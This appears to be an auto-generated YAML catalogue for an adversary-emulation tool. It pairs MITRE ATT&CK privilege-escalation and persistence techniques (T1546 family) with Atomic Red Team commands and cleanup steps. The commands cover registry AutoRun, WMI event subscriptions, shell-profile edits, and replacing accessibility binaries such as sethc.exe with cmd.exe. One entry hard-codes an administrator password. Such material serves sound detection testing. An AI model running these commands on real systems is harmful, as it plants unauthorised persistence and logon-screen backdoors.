# AutoStrike MITRE ATT&CK Techniques - privilege-escalation
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1546
  name: Event Triggered Execution
  description: 'Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automa...'
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Persistence with Custom AutodialDLL
      type: powershell
      platform: windows
      command: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value PathToAtomicsFolder\T1546\bin\AltWinSock2DLL.dll
      cleanup: Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters -Name AutodialDLL -Value  $env:windir\system32\rasadhlp.dll
      timeout: 120
      elevation_required: true
    - name: HKLM - Persistence using CommandProcessor AutoRun key (With Elevation)
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"
      cleanup: Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: HKCU - Persistence using CommandProcessor AutoRun key (Without Elevation)
      type: powershell
      platform: windows
      command: |-
        $path = "HKCU:\Software\Microsoft\Command Processor"
        if (!(Test-Path -path $path)){
          New-Item -ItemType Key -Path $path
        }
        New-ItemProperty -Path $path -Name "AutoRun" -Value "notepad.exe" -PropertyType "String"
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Command Processor" -Name "AutoRun" -ErrorAction Ignore
      timeout: 120
    - name: WMI Invoke-CimMethod Start Process
      type: powershell
      platform: windows
      command: |-
        # Set the remote computer name and credentials
         $RemoteComputer = "localhost"
         $PWord = ConvertTo-SecureString -String "P@ssword1" -AsPlainText -Force
         $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "Administrator", $Pword

         # Create a CIM session
         $CimSession = New-CimSession -ComputerName $RemoteComputer -Credential $Credential

         # Define the process you want to start
         $ProcessToStart = "calc.exe"

         # Invoke the Create method on the Win32_Process class to start the process
         $Result = Invoke-CimMethod -CimSession $CimSession -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $ProcessToStart}

         # Check the result
         if ($Result.ReturnValue -eq 0) {
             Write-Host "Process started successfully with Process ID: $($Result.ProcessId)"
         } else {
             Write-Host "Failed to start the process. Error code: $($Result.ReturnValue)"
         }

         # Clean up the CIM session
         Remove-CimSession -CimSession $CimSession
      timeout: 120
      elevation_required: true
    - name: Adding custom debugger for Windows Error Reporting
      type: cmd
      platform: windows
      command: reg add "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /t REG_SZ /d "C:\Windows\System32\notepad.exe" /f
      cleanup: reg delete "HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs" /v Debugger /f
      timeout: 120
      elevation_required: true
    - name: Load custom DLL on mstsc execution
      type: cmd
      platform: windows
      command: reg add "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKLM\SOFTWARE\Microsoft\Terminal Server Client" /v ClxDllPath /f
      timeout: 120
      elevation_required: true
    - name: Persistence using automatic execution of custom DLL during RDP session
      type: cmd
      platform: windows
      command: reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /v Path /t REG_SZ /d "C:\Windows\System32\amsi.dll" /f
      cleanup: reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\AddIns\TestDVCPlugin" /f
      timeout: 120
      elevation_required: true
    - name: Persistence via ErrorHandler.cmd script execution
      type: powershell
      platform: windows
      command: |-
        Copy-Item -Path PathToAtomicsFolder\T1546\src\ErrorHandler.cmd -Destination C:\Windows\Setup\Scripts\ErrorHandler.cmd
        C:\windows\System32\oobe\Setup
      cleanup: Remove-Item C:\Windows\Setup\Scripts\ErrorHandler.cmd
      timeout: 120
      elevation_required: true
    - name: Persistence using STARTUP-PATH in MS-WORD
      type: cmd
      platform: windows
      command: reg add "HKCU\Software\Microsoft\Office\16.0\Word\Options" /v STARTUP-PATH /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Recent" /f
      cleanup: reg delete HKCU\Software\Microsoft\Office\16.0\Word\Options /v STARTUP-PATH /f
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546
  is_safe: false
- id: T1546.001
  name: Change Default File Association
  description: 'Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File ...'
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Change Default File Association
      type: cmd
      platform: windows
      command: assoc .hta=txtfile
      cleanup: assoc  .hta=htafile
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/001
  is_safe: false
- id: T1546.002
  name: Screensaver
  description: 'Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Win...'
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Set Arbitrary Binary as Screensaver
      type: cmd
      platform: windows
      command: |-
        reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg
        copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
        reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
        if 0 NEQ 0 shutdown /r /t 0
      cleanup: |-
        reg import %userprofile%\backup.reg
        del %userprofile%\backup.reg
        del %SystemRoot%\System32\evilscreensaver.scr
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/002
  is_safe: false
- id: T1546.003
  name: Windows Management Instrumentation Event Subscription
  description: |-
    Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

    Adversaries may use the capabilities of WMI to subscribe to an ev...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Persistence via WMI Event Subscription - CommandLineEventConsumer
      type: powershell
      platform: windows
      command: |-
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                        CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
        $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = [Ref] $Filter;
        Consumer = [Ref] $Consumer;
        }
        $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
      elevation_required: true
    - name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
      type: powershell
      platform: windows
      command: |-
        $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        EventNameSpace='root\CimV2';
                        QueryLanguage="WQL";
                        Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
        $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

        $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
                        ScriptingEngine='VBScript';
                        ScriptText='
                        Set objws = CreateObject("Wscript.Shell")
                        objws.Run "notepad.exe", 0, True
                        '}
        $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

        $FilterToConsumerArgs = @{
        Filter = $Filter;
        Consumer = $Consumer;
        }
        $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
      elevation_required: true
    - name: Windows MOFComp.exe Load MOF File
      type: powershell
      platform: windows
      command: c:\windows\system32\wbem\mofcomp.exe "PathToAtomicsFolder\T1546.003\src\T1546.003.mof"
      cleanup: |-
        $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam_consumer'"
        $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam_filter'"
        $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
        $FilterConsumerBindingToCleanup | Remove-WmiObject
        $EventConsumerToCleanup | Remove-WmiObject
        $EventFilterToCleanup | Remove-WmiObject
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1546/003
  is_safe: false
- id: T1546.004
  name: Unix Shell Configuration Modification
  description: Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - linux
    - macos
  executors:
    - name: Add command to .bash_profile
      type: sh
      platform: macos
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bash_profile
      cleanup: |-
        head -n '-2' ~/.bash_profile > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bash_profile
      timeout: 60
    - name: Add command to .bash_profile
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bash_profile
      cleanup: |-
        head -n '-2' ~/.bash_profile > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bash_profile
      timeout: 60
    - name: Add command to .bashrc
      type: sh
      platform: macos
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bashrc
      cleanup: |-
        head -n '-2' ~/.bashrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bashrc
      timeout: 60
    - name: Add command to .bashrc
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.bashrc
      cleanup: |-
        head -n '-2' ~/.bashrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.bashrc
      timeout: 60
    - name: Add command to .shrc
      type: sh
      platform: linux
      command: echo 'echo "Hello from Atomic Red Team T1546.004" > /tmp/T1546.004' >> ~/.shrc
      cleanup: |-
        head -n '-2' ~/.shrc > /tmp/T1546.004
        mv /tmp/T1546.004 ~/.shrc
      timeout: 60
    - name: Append to the system shell profile
      type: sh
      platform: linux
      command: echo '# Hello from Atomic Red Team T1546.004' >> /etc/profile
      cleanup: sed -i "s/# Atomic Red Team was here! T1546.004//" /etc/profile
      timeout: 60
      elevation_required: true
    - name: Append commands user shell profile
      type: sh
      platform: linux
      command: echo '# Atomic Red Team was here... T1546.004' >> ~/.profile
      cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" ~/.profile
      timeout: 60
    - name: System shell profile scripts
      type: sh
      platform: linux
      command: echo '# Atomic Red Team was here... T1546.004' >> /etc/profile.d/bash_completion.sh
      cleanup: sed -i "s/# Atomic Red Team was here... T1546.004//" /etc/profile.d/bash_completion.sh
      timeout: 60
      elevation_required: true
    - name: Create/Append to .bash_logout
      type: bash
      platform: linux
      command: |-
        useradd --create-home --shell /bin/bash art
        su -l art -c "echo 'echo \"Atomic Red Team was here... T1546.004\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit"
      cleanup: userdel -fr art
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/004
  is_safe: false
- id: T1546.005
  name: Trap
  description: |-
    Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

    Adversaries can use this to register code to be executed when the shell encounters specific interrupts as...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - macos
    - linux
  executors:
    - name: Trap EXIT
      type: sh
      platform: macos
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
    - name: Trap EXIT
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
    - name: Trap EXIT (freebsd)
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" EXIT'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
    - name: Trap SIGINT
      type: sh
      platform: macos
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
    - name: Trap SIGINT
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
    - name: Trap SIGINT (freebsd)
      type: sh
      platform: linux
      command: bash -c 'trap "nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh" SIGINT && kill -SIGINT $$'
      cleanup: rm -f /tmp/art-fish.txt
      timeout: 60
  references:
    - https://attack.mitre.org/techniques/T1546/005
  is_safe: false
- id: T1546.007
  name: Netsh Helper DLL
  description: |-
    Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

    Adversaries can...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Netsh Helper DLL Registration
      type: cmd
      platform: windows
      command: |-
        netsh.exe add helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"
        taskkill /im notepad.exe /t /f > NUL 2>&1
      cleanup: netsh.exe delete helper "PathToAtomicsFolder\T1546.007\bin\NetshHelper.dll"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/007
  is_safe: false
- id: T1546.008
  name: Accessibility Features
  description: |-
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

    Two common accessibility programs are <code>C:\Windows\System32\sethc.exe...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Attaches Command Prompt as a Debugger to a List of Target Processes
      type: powershell
      platform: windows
      command: |-
        $input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
        $Name = "Debugger"
        $Value = "C:\windows\system32\cmd.exe"
        Foreach ($item in $input_table){
          $item = $item.trim()
          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
          IF(!(Test-Path $registryPath))
          {
            New-Item -Path $registryPath -Force
            New-ItemProperty -Path $registryPath -Name $name -Value $Value -PropertyType STRING -Force
          }
          ELSE
          {
            New-ItemProperty -Path $registryPath -Name $name -Value $Value
          }
        }
      cleanup: |-
        $input_table = "osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe".split(",")
        Foreach ($item in $input_table)
        {
          $item = $item.trim()
          reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item" /v Debugger /f 2>&1 | Out-Null
        }
      timeout: 120
      elevation_required: true
    - name: Replace binary of sticky keys
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\sethc_backup.exe (copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\sethc.exe /A
        icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
      cleanup: copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
      timeout: 120
      elevation_required: true
    - name: Create Symbolic Link From osk.exe to cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd )
        takeown /F %windir%\System32\osk.exe /A
        icacls %windir%\System32\osk.exe /grant Administrators:F /t
        del %windir%\System32\osk.exe
        mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
      cleanup: |-
        takeown /F %windir%\System32\osk.exe /A
        icacls %windir%\System32\osk.exe /grant Administrators:F /t
        del %windir%\System32\osk.exe
        copy /Y %windir%\System32\osk.exe.bak %windir%\System32\osk.exe
        icacls %windir%\system32\osk.exe /inheritance:d
        icacls %windir%\system32\osk.exe /setowner "NT SERVICE\TrustedInstaller"
        icacls %windir%\System32\osk.exe /grant "NT SERVICE\TrustedInstaller":F /t
        icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
        icacls %windir%\system32\osk.exe /grant:r Administrators:RX
      timeout: 120
      elevation_required: true
    - name: Atbroker.exe (AT) Executes Arbitrary Command via Registry Key
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
        atbroker /start malware_test
      cleanup: reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
      timeout: 120
      elevation_required: true
    - name: Auto-start application on user logon
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f
        reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /t REG_SZ /d malware_test /f
      cleanup: |-
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test" /f
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs" /v Configuration /f
      timeout: 120
      elevation_required: true
    - name: Replace utilman.exe (Ease of Access Binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\utilman_backup.exe (copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\utilman.exe /A
        icacls C:\Windows\System32\utilman.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
      cleanup: copy /Y C:\Windows\System32\utilman_backup.exe C:\Windows\System32\utilman.exe
      timeout: 120
      elevation_required: true
    - name: Replace Magnify.exe (Magnifier binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\Magnify_backup.exe (copy C:\Windows\System32\Magnify.exe C:\Windows\System32\Magnify_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\Magnify.exe /A
        icacls C:\Windows\System32\Magnify.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Magnify.exe
      cleanup: copy /Y C:\Windows\System32\Magnify_backup.exe C:\Windows\System32\Magnify.exe
      timeout: 120
      elevation_required: true
    - name: Replace Narrator.exe (Narrator binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\Narrator_backup.exe (copy C:\Windows\System32\Narrator.exe C:\Windows\System32\Narrator_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\Narrator.exe /A
        icacls C:\Windows\System32\Narrator.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe
      cleanup: copy /Y C:\Windows\System32\Narrator_backup.exe C:\Windows\System32\Narrator.exe
      timeout: 120
      elevation_required: true
    - name: Replace DisplaySwitch.exe (Display Switcher binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\DisplaySwitch_backup.exe (copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\System32\DisplaySwitch_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\DisplaySwitch.exe /A
        icacls C:\Windows\System32\DisplaySwitch.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\DisplaySwitch.exe
      cleanup: copy /Y C:\Windows\System32\DisplaySwitch_backup.exe C:\Windows\System32\DisplaySwitch.exe
      timeout: 120
      elevation_required: true
    - name: Replace AtBroker.exe (App Switcher binary) with cmd.exe
      type: cmd
      platform: windows
      command: |-
        IF NOT EXIST C:\Windows\System32\AtBroker_backup.exe (copy C:\Windows\System32\AtBroker.exe C:\Windows\System32\AtBroker_backup.exe) ELSE ( pushd )
        takeown /F C:\Windows\System32\AtBroker.exe /A
        icacls C:\Windows\System32\AtBroker.exe /grant Administrators:F /t
        copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\AtBroker.exe
      cleanup: copy /Y C:\Windows\System32\AtBroker_backup.exe C:\Windows\System32\AtBroker.exe
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/008
  is_safe: false
- id: T1546.009
  name: AppCert DLLs
  description: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>,...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Create registry persistence via AppCert DLL
      type: powershell
      platform: windows
      command: |-
        Copy-Item "PathToAtomicsFolder\T1546.009\bin\AtomicTest.dll" C:\Users\Public\AtomicTest.dll -Force
        reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /t REG_EXPAND_SZ /d "C:\Users\Public\AtomicTest.dll" /f
        if($false){Restart-Computer}
      cleanup: |-
        reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "AtomicTest" /f
        Remove-Item C:\Users\Public\AtomicTest.dll -Force
        Remove-Item C:\Users\Public\AtomicTest.txt -Force
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/009
  is_safe: false
- id: T1546.010
  name: AppInit DLLs
  description: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> or <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> are loaded by user32.dll into every process that loads user32....
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Install AppInit Shim
      type: cmd
      platform: windows
      command: reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010.reg"
      cleanup: reg.exe import "PathToAtomicsFolder\T1546.010\src\T1546.010-cleanup.reg" >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1546/010
  is_safe: false
- id: T1546.011
  name: Application Shimming
  description: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims. The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time. For example, the application shimming feature allows developers to apply fixes to applications (without rewriting code) that were created for Windows XP so that it will ...
  tactic: privilege-escalation
  tactics:
    - privilege-escalation
    - persistence
  platforms:
    - windows
  executors:
    - name: Application Shim Installation
      type: cmd
      platform: windows
      command: sdbinst.exe "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"
      cleanup: sdbinst.exe -u "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb" >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: New shim database files created in the default shim database directory
      type: powershell
      platform: windows
      command: |-
        Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb
        Copy-Item "$PathToAtomicsFolder\T1546.011\bin\T1546.011CompatDatabase.sdb" C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb
      cleanup: |-
        Remove-Item C:\Windows\apppatch\Custom\T1546.011CompatDatabase.sdb -ErrorAction Ignore
        Remove-Item C:\Windows\apppatch\Custom\Custom64\T1546.011CompatDatabase.sdb -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Registry key creation and/or modification events for SDB
      type: powershell
